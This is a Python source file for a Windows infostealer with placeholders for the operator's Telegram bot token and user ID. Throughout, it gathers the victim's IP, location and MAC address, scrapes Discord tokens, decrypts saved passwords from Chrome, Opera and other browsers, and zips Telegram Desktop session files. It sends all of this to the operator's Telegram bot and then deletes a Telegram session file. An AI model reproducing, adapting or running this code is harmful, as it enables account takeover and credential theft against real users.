import random

try:
    from telebot import TeleBot
    import shutil
    import json
    from base64 import b64decode
    import win32crypt
    from win32crypt import CryptUnprotectData
    from Crypto.Cipher import AES
    import os
    import sqlite3
    import time
    from uuid import getnode as get_mac
    import re
    from requests import get
    import win32api
    from zipfile import ZipFile
except Exception as e:
    print("ERROR importing: " + repr(e))
    pass


log_out = 1  # 1 - is on, 0 - is off


user_id = 123456789 # your_id
token = 'your_token'
name_ur_txt = 'browser_passwords.txt'
bot = TeleBot(token)
pathusr = os.path.expanduser('~')
local = os.getenv("LOCALAPPDATA")
temp = os.path.join(local, "Temp")
ttemp = os.path.join(local, "Temp", "tdata")

######################################################################## IP ########################################################ъ
ip_info = "################## IP INFO ##################\n\n"
publicip = get('https://api.ipify.org').text # Get public API
ip_info += f"#### ip: {publicip} ####\n"
city = get(f'https://ipapi.co/{publicip}/city').text
ip_info += f"### city: {city} ####\n"
region = get(f'https://ipapi.co/{publicip}/region').text
ip_info += f"### region: {region} ####\n"
postal = get(f'https://ipapi.co/{publicip}/postal').text
ip_info += f"### postal: {postal} ####\n"
timezone = get(f'https://ipapi.co/{publicip}/timezone').text
ip_info += f"### timezone: {timezone} ####\n"
currency = get(f'https://ipapi.co/{publicip}/currency').text
ip_info += f"### currency: {currency} ####\n"
country = get(f'https://ipapi.co/{publicip}/country_name').text
ip_info += f"### country: {country} ####\n"
callcode = get(f"https://ipapi.co/{publicip}/country_calling_code").text
ip_info += f"### callcode: {callcode} ####\n"
vpn = get('http://ip-api.com/json?fields=proxy')
proxy = vpn.json()['proxy']
ip_info += f"### proxy: {proxy} ####\n"
mac = get_mac()
ip_info += f"### mac-address: {mac} ####\n"
ip_info += "##########################################"
bot.send_message(user_id, ip_info)
####################################################################################################################################

#desktop = os.path.join(pathusr, "Desktop\\tdata\\")
paths = ['C:\\', 'D:\\', 'E:\\', 'F:\\', 'G:\\', 'H:\\', 'I:\\', 'J:\\']
path = os.path.expandvars(r'%LocalAppData%\Google\Chrome\User Data\Local State')

def find_tokens(path):
    path += '\\Local Storage\\leveldb'
    tokens = []
    for file_name in os.listdir(path):
        if not file_name.endswith('.log') and not file_name.endswith('.ldb'):
            continue
        for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
            for regex in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}', r'mfa\.[\w-]{84}'):
                for token in re.findall(regex, line):
                    tokens.append(token)
    return tokens

def main():
    local = os.getenv('LOCALAPPDATA')
    roaming = os.getenv('APPDATA')
    message = '### DISCORD TOKENS ###\n\n'
    paths = {
        'Discord': roaming + '\\Discord',
        'Discord Canary': roaming + '\\discordcanary',
        'Discord PTB': roaming + '\\discordptb',
    }
    for platform, path in paths.items():
        if not os.path.exists(path):
            continue
        tokens = find_tokens(path)
        if len(tokens) > 0:
            for token in tokens:
                message += f'{token}\n\n'
        else:
            message += '#### No tokens found ####'
    message += '################################################'
    return message
bot.send_message(user_id, main())
def getmasterkey():
    try:
        with open(path, encoding="utf-8") as f:
            load = json.load(f)["os_crypt"]["encrypted_key"]
            master_key = b64decode(load)
            master_key = master_key[5:]
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key
    except:
        print("ERROR: couldn't access the masterkey")
        pass


def decryption(buff, key):
    try:
        payload = buff[15:]
        iv = buff[3:15]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass
    except Exception as e:
        print("ERROR in decryption: " + repr(e))
# global opera
# opera = ' \n\n\n\n #### OPERA PASSWORDS #### \n\n\n\n'
# def Opera(opr):
# 	if os.path.exists(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Login Data'):
# 	    shutil.copy2(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Login Data', os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\opera_done')

# 	    connection = sqlite3.connect(os.getenv('APPDATA') + "\\Opera Software\\Opera Stable\\opera_done")
# 		# connection = sqlite3.connect(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\opera_done')
# 	    cursor = connection.cursor()
# 	    cursor.execute('SELECT action_url, username_value, password_value FROM logins') 
# 	    for result in cursor.fetchall():
# 	        password = win32crypt.CryptUnprotectData(result[2])[1].decode()
# 	        login = result[1]
# 	        url = result[0]
# 	        if password != '':
# 	        	opr +='  [URL] ==>  ' + url + '  [LOGIN] ==> ' + login + '  [PASSWORD] ==> ' + password + '\n\n'
# 	        with open(name_browser_passwd2, 'w', encoding='utf-8') as f:
# 	        	f.write(f"{opr}\n")
# 	        	f.close()
# Opera(opera)
# bot.send_message(user_id, opera)
def Chrome():
    text = '####### Browser passwords #######\n'
    text += "#### Google Chrome ####\n"
    if os.path.exists(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data'):
        shutil.copy2(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data',
                        os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2')
        conn = sqlite3.connect(os.getenv("LOCALAPPDATA") + '\\Google\\Chrome\\User Data\\Default\\Login Data2')
        cursor = conn.cursor()
        cursor.execute(f'SELECT action_url, username_value, password_value FROM logins')
        for result in cursor.fetchall():
            password = result[2]
            print("ДО {}".format(password))
            login = result[1]
            url = result[0]
            decrypted_pass = decryption(password, getmasterkey())
            print(f"ПОСЛЕ {decrypted_pass}")
            text += "[URL] ==> " + url + ' [LOGIN] ==> ' + login + ' [PASSWORD] ==> ' + str(decrypted_pass) + '\n'
            with open(name_ur_txt, "w", encoding="utf-8") as f:
                f.write(text)
    if os.path.exists(os.getenv("APPDATA") + "\\Opera Software\\Opera Stable\\Login Data") and os.path.exists(os.getenv("APPDATA") + "\\Opera Software\\Opera Stable\\Sessions"):
        text += "\n\n'#### Opera Passwd ####\n"
        shutil.copy2(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Login Data', os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\opera_done')

        connection = sqlite3.connect(os.getenv('APPDATA') + "\\Opera Software\\Opera Stable\\opera_done")
        # connection = sqlite3.connect(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\opera_done')
        cursor = connection.cursor()
        cursor.execute('SELECT action_url, username_value, password_value FROM logins')
        for result in cursor.fetchall():
            #passwd = result[2]
            print("ДО {}".format(result[2]))
            password = decryption(result[2], getmasterkey())
            login = result[1]
            url = result[0]
            print(f"ПОСЛЕ {password}")
            if password != '':
                text +='  [URL] ==>  ' + url + '  [LOGIN] ==> ' + login + '  [PASSWORD] ==> ' + str(password) + '\n\n'

    # elif os.path.exists(os.getenv('APPDATA') + "\\Opera Software\\Opera Stable\\Sessions"):
    #     for files in os.listdir():
    #         send_txt(files)
# def Firefox():
#     textf = ''
#     textf += '\n' + 'Stealer coded by Dark $ide\n\n\nFirefox Cookies:' + '\n'
#     textf += 'URL | COOKIE | COOKIE NAME' + '\n'
#     for root, dirs, files in os.walk(os.getenv("APPDATA") + '\\Mozilla\\Firefox\\Profiles'):
#         for name in dirs:
#             conn = sqlite3.connect(os.path.join(root, name)+'\\cookies.sqlite')
#             cursor = conn.cursor()
#             cursor.execute("SELECT baseDomain, value, name FROM moz_cookies")
#             data = cursor.fetchall()
#             for i in range(len(data)):
#                 url, cookie, name = data[i]
#                 textf += url + ' | ' + str(cookie) + ' | ' + name + '\n'
#         break
#     return textf
# file = open(os.getenv("APPDATA") + '\\firefox_cookies.txt', "w+")#данные
# file.write(str(Firefox()) + '\n')
# file.close()


def browsers():
    pathusr = os.path.expanduser('~')
    vivaldi = pathusr + "\\AppData\\Local\\Vivaldi\\User Data\\Default\\Login Data"
    chrome = pathusr + "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data"
    yandex = pathusr + "\\AppData\\Local\\Yandex\\YandexBrowser\\User Data\\Default\\Login Data"
    opera = pathusr + "\\AppData\\Roaming\\Opera Software\\Opera Stable\\Login Data"
    kometa = pathusr + "\\AppData\\Local\\Kometa\\User Data\\Default\\Login Data"
    orbitum = pathusr + "\\AppData\\Local\\Orbitum\\User Data\\Default\\Login Data"
    comodo = pathusr + "\\AppData\\Local\\Comodo\\Dragon\\User Data\\Default\\Login Data"
    amigo = pathusr + "\\AppData\\Local\\Amigo\\User\\User Data\\Default\\Login Data"
    torch = pathusr + "\\AppData\\Local\\Torch\\User Data\\Default\\Login Data"

    databases = [vivaldi, chrome, yandex, opera, kometa, orbitum, comodo, amigo, torch]

    coped_db = pathusr + "\AppData\Logins"
    file_with_logs = pathusr + "\AppData\Local\Temp\Logins.txt"

    for db in databases:
        try:
            source = open(db, 'r')
            source.close()
            source_size = os.stat(db).st_size
            copied = 0
            source = open(db, 'rb')
            target = open(coped_db, 'wb')
            while True:
                chunk = source.read(32768)
                if not chunk:
                    break
                target.write(chunk)
                copied += len(chunk)

            source.close()
            target.close()

            con = sqlite3.connect(coped_db)
            cursor = con.cursor()

            cursor.execute("SELECT origin_url, username_value, password_value from logins;")

            var_with_logs = ''
            for log in cursor.fetchall():
                password = win32crypt.CryptUnprotectData(log[2])
                var_with_logs += str('URL: ' + log[0] + '\n')
                var_with_logs += str('Login : ' + log[1] + '\n')
                var_with_logs += str('Password : ' + password + '\n\n')
            print(var_with_logs)
            file = open(file_with_logs, 'w')
            file.writelines(var_with_logs)
            file.close()

            str1 = '123456789'
            str2 = 'qwertyuiopasdfghjklzxcvbnm'
            str3 = str2.upper()
            str4 = str1 + str2 + str3
            ls = list(str4)
            random.shuffle(ls)
            randomstr = ''.join([random.choice(ls) for x in range(10)])

            ftpbase = randomstr + '.txt'
            bot.send_document(user_id, open(file_with_logs,'rb'))

        except Exception as e:
            pass
browsers()
# def Opera():
#   Opera = ' \n\n\n\n #### OPERA PASSWORDS #### \n\n\n\n'
#   if os.path.exists(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Login Data'):
#       shutil.copy2(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\Login Data', os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\opera_done')
#
#       connection = sqlite3.connect(os.getenv("APPDATA") + '\\Opera Software\\Opera Stable\\opera_done')
#       cursor = connection.cursor()
#       cursor.execute('SELECT action_url, username_value, password_value FROM logins')
#       for result in cursor.fetchall():
#           password = win32crypt.CryptUnprotectData(result[2])[1].decode()
#           login = result[1]
#           url = result[0]
#           if password != '':
#             Opera +='  [URL] ==>  ' + url + '  [LOGIN] ==> ' + login + '  [PASSWORD] ==> ' + password + '\n\n'
#   return Opera

def finddir(path):
    for root, dirs, files in os.walk(path):
        for name in dirs:
            if name == "Telegram Desktop":
                found = os.path.join(root, name)
                print("***Checking folder: " + found)
                if os.path.exists(found + '\\Telegram.exe'):
                    print("***OK Telegram Desktop has been found")
                    return found
                else:
                    print("ERROR: ^ this is not an actual TG folder. Continuing...")
                    pass

def getFileProperties(fname):
    props = {'FileVersion': None}
    try:
        # backslash as parm returns dictionary of numeric info corresponding to VS_FIXEDFILEINFO struc
        fixedInfo = win32api.GetFileVersionInfo(fname, '\\')
        props['FileVersion'] = "%d.%d.%d.%d" % (fixedInfo['FileVersionMS'] / 65536,
                fixedInfo['FileVersionMS'] % 65536, fixedInfo['FileVersionLS'] / 65536,
                fixedInfo['FileVersionLS'] % 65536)
    except Exception as e:
        print(repr(e))
        pass
    return props


def logout_windows(bool):
    if bool:
        try:
            global pathd877
            os.system('taskkill /f /im Telegram.exe')
            os.remove(pathd877)
        except Exception as e:
            print("ERROR: Failed to logout: " + repr(e))
            pass
    else:
        print("***Logout state is 0")
        pass


def send_txt(arg):
    try:
        bot.send_document(user_id, open(arg,'rb'))
        os.remove(arg)
        print("***OK Passwords have been sended successfully")
    except Exception as e:
        print("ERROR in send_txt() func: " + repr(e))
        pass




def send_session_files(path):
    version = getFileProperties(os.path.join(path[:-5],"Telegram.exe"))["FileVersion"]
    try:
        os.mkdir(ttemp)
        print("good")
    except:
        print("err")
    #print(user)
    for root, dirs, files in os.walk(path):
        for dir in dirs:
            if dir[0:15] == "D877F783D5D3EF8":
                mapsdir = os.path.join(path, dir)
                try:
                    os.mkdir(os.path.join(ttemp, dir))
                except:
                    pass
                if os.path.exists(os.path.join(root,dir,'maps')):
                    #print("***OK Matched maps in " + path)
                    shutil.copy2(os.path.join(mapsdir, 'maps'), (os.path.join(ttemp,dir,"maps")))
            elif dir[0:15] == "A7FDF864FBC10B7":
                mapsdir = os.path.join(path, dir)
                try:
                    os.mkdir(os.path.join(ttemp, dir))
                except:
                    pass
                if os.path.exists(os.path.join(root, dir, 'maps')):
                    #print("***OK Matched maps in " + path)
                    shutil.copy2(os.path.join(mapsdir, 'maps'), (os.path.join(ttemp, dir, "maps")))
            elif dir[0:15] == "F8806DD0C461824":
                mapsdir = os.path.join(path, dir)
                try:
                    os.mkdir(os.path.join(ttemp, dir))
                except:
                    pass
                if os.path.exists(os.path.join(root, dir, 'maps')):
                    #print("***OK Matched maps in " + path)
                    shutil.copy2(os.path.join(mapsdir, 'maps'), (os.path.join(ttemp, dir, "maps")))
                        # bot.send_document(user_id, open(os.path.join(mapsdir, file), 'rb'), caption=path + "\nVersion: " + user)
        for file in files:
            if file[0:15] == "D877F783D5D3EF8":
                #print("***OK Matched D877F783D5D3EF8 in " + path)
                pathd877 = os.path.join(path, file)
                shutil.copy2(pathd877,(os.path.join(ttemp,file)))
                #bot.send_document(user_id, open(os.path.join(file, pathd877), 'rb'), caption=path + "\nVersion: " + user)
            elif file[0:15] == "A7FDF864FBC10B7":
                #print("***OK Matched D877F783D5D3EF8 in " + path)
                pathd877 = os.path.join(path, file)
                shutil.copy2(pathd877,(os.path.join(ttemp,file)))
            elif file[0:15] == "F8806DD0C461824":
                #print("***OK Matched D877F783D5D3EF8 in " + path)
                pathd877 = os.path.join(path, file)
                shutil.copy2(pathd877,(os.path.join(ttemp,file)))
            elif file == "key_datas":
                #print("***OK Matched key_datas in " + path)
                pathkey = os.path.join(path, file)
                shutil.copy2(pathkey, (os.path.join(ttemp, file)))
                #bot.send_document(user_id, open(os.path.join(file, pathkey), 'rb'), caption=path + "\nVersion: " + user)

    with ZipFile(os.path.join(temp,'tdata.zip'), 'w') as zipObj:
        # Iterate over all the files in directory
        for folderName, subfolders, filenames in os.walk(ttemp):
            for filename in filenames:
                # create complete filepath of file in directory
                filePath = os.path.join(folderName, filename)
                # Add file to zip
                zipObj.write(filePath)
    bot.send_document(user_id, open(os.path.join(temp, 'tdata.zip'), 'rb'), caption=path + "\nVersion: " + version)


if os.path.exists(pathusr + '\\AppData\\Roaming\\Telegram Desktop'):
    tddir = (pathusr + '\\AppData\\Roaming\\Telegram Desktop\\')
    tdata_path = (pathusr + '\\AppData\\Roaming\\Telegram Desktop\\tdata')
    print("***OK Default TG folder has been found")
    send_session_files(tdata_path)
else:
    print("ERROR: Telegram folder is not default. Continuing...")


for i in paths:
    found = finddir(i)
    if found != None and found != (pathusr + '\\AppData\\Roaming\\Telegram Desktop'):
        tddir = found
        tdata_path = (os.path.join(tddir, "tdata"))
        send_session_files(tdata_path)


def main():
    # try:
    Chrome()
    bot.send_message(user_id, pathusr)
    send_txt(name_ur_txt)
    #send_txt(name_browser_passwd3)
    logout_windows(log_out)
    # except Exception as e:
    #     print('ERROR: Main function: ' + repr(e))
    #     pass


if __name__ == '__main__':
    main()
    time.sleep(3)
    print("***Finished***")